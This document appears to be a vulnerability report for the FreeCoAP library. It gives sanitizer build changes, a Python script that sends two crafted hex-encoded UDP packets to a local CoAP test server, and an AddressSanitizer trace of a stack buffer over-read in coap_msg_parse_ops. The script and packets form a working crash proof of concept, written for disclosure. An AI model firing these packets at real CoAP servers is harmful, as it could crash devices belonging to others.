# Bug：Stack Buffer Overflow Detected in coap_msg.c at coap_msg_parse_ops Function

## Reproduce Info

### Build Environment Update

The `Makefile` within the `test_coap_server` directory has been updated to utilize `clang` with sanitizers. 
```diff
 I1 = ../../lib/include
 S1 = ../../lib/src
-CC_ ?= gcc
-CFLAGS = -Wall \
+CC_ ?= clang
+CFLAGS = -Wall -g -fsanitize=address,undefined -fno-omit-frame-pointer\
          -I $(I1)
 CFLAGS += $(IP6_CFLAGS)
 CFLAGS += $(DTLS_CFLAGS)
-LD_ ?= gcc
-LDFLAGS =
+LD_ ?= clang
+LDFLAGS = -fsanitize=address,undefined
 INCS = $(I1)/coap_server.h \
        $(I1)/coap_msg.h \
        $(I1)/coap_mem.h \
```

### Building test_coap_server

```sh
cd FreeCoAP/test/test_coap_server
make dtls=n
```
## Run Instructions

### Starting the CoAP Server

The CoAP server was started using the `test_coap_server` executable:

```sh
cd FreeCoAP/test/test_coap_server
./test_coap_server 1234
```
### Sending the Packet
Sending packets from the client to the server using a series of hexstreams in：
hexstream.txt
Here is a script that can help you send the hexstreams:

```
import socket

def send_hexstream_to_server(hexstream, server_ip, server_port):
    # Convert hexstream to bytes
    data = bytes.fromhex(hexstream)
    
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        # Send data to the server
        sock.sendto(data, (server_ip, server_port))
        print(f"Sent hexstream to {server_ip}:{server_port}")
    except Exception as e:
        print(f"Failed to send hexstream: {e}")
    finally:
        sock.close()

# Define the server IP and port
server_ip = "127.0.0.1"
server_port = 1234

# Define the hexstreams
hexstreams = [
    "4401c1ba7d7447a7b7726567756c61722d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d3839363637",
    "35612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d383936363735612d2d2d383936363734612d2d383936363735612d2d3138343436373434303733373039353531363137612d2d383936363735612d2d383936363735612d2d31612d2d383936363735612d2d383936363735612d2d38393636373561"
]
for hexstream in hexstreams:
    send_hexstream_to_server(hexstream, server_ip, server_port)

```



## Description
AddressSanitizer has detected a stack buffer overflow issue within the coap_msg_parse_ops function, specifically at line 643 in coap_msg.c. 

## Crash report

Here is the ASan report:
```
==120670==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f616de7a4d0 at pc 0x0000004ea16e bp 0x7fff6af4fcc0 sp 0x7fff6af4fcb8
READ of size 1 at 0x7f616de7a4d0 thread T0
    #0 0x4ea16d in coap_msg_parse_ops FreeCoAP/test/test_coap_server/../../lib/src/coap_msg.c:643:15
    #1 0x4e8b04 in coap_msg_parse FreeCoAP/test/test_coap_server/../../lib/src/coap_msg.c:744:11
    #2 0x4e00f1 in coap_server_trans_recv FreeCoAP/test/test_coap_server/../../lib/src/coap_server.c:1089:11
    #3 0x4d9b85 in coap_server_exchange FreeCoAP/test/test_coap_server/../../lib/src/coap_server.c:2285:11
    #4 0x4d7cdf in coap_server_run FreeCoAP/test/test_coap_server/../../lib/src/coap_server.c:2559:15
    #5 0x4c8b95 in main FreeCoAP/test/test_coap_server/test_coap_server.c:750:11
    #6 0x7f617100c0b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16
    #7 0x41c36d in _start (FreeCoAP/test/test_coap_server/test_coap_server+0x41c36d)

Address 0x7f616de7a4d0 is located in stack of thread T0 at offset 1232 in frame
    #0 0x4df7df in coap_server_trans_recv FreeCoAP/test/test_coap_server/../../lib/src/coap_server.c:1027

  This frame has 3 object(s):
    [32, 48) 'client_sin' (line 1032)
    [64, 68) 'client_sin_len' (line 1034)
    [80, 1232) 'buf' (line 1038) <== Memory access at offset 1232 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow FreeCoAP/test/test_coap_server/../../lib/src/coap_msg.c:643:15 in coap_msg_parse_ops
Shadow bytes around the buggy address:
  0x0fecadbc7440: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fecadbc7450: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fecadbc7460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fecadbc7470: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fecadbc7480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0fecadbc7490: 00 00 00 00 00 00 00 00 00 00[f3]f3 f3 f3 f3 f3
  0x0fecadbc74a0: f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00
  0x0fecadbc74b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fecadbc74c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fecadbc74d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fecadbc74e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==120670==ABORTING


```